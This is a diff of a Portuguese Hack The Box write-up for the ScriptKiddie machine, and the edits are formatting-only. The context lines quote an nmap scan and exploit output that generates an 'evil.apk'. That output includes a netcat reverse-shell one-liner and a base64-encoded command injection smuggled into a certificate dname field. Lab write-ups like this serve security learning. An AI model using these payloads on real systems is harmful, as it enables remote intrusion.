@@ -19,8 +19,10 @@ Olá pessoal!
 
 A máquina desta semana será **ScriptKiddie**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xdf](https://app.hackthebox.eu/users/4935).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são
+  aposentadas
+</Alert>
 
 ![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png)
 
@@ -29,7 +31,7 @@ A máquina desta semana será **ScriptKiddie**, outra máquina Linux classificad
 Como de costume, iniciado enumeração com um scan rápido do `nmap` para verificar os serviços publicados nesta máquina.
 
 ```bash
-$ nmap -sC -sV -Pn -oA quick 10.10.10.226                                                                   
+$ nmap -sC -sV -Pn -oA quick 10.10.10.226
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 14:05 -03
@@ -91,7 +93,7 @@ dname = f"CN='|echo -n {payload_b64} {decode} | sh #"
 Abaixo podemos ver o output da criação do payload gerado, no caso o arquivo `evil.apk`
 
 ```bash
-$ python3 49491.py                                                                                                               
+$ python3 49491.py
 [+] Manufacturing evil apkfile
 Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
 -dname: CN='|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #
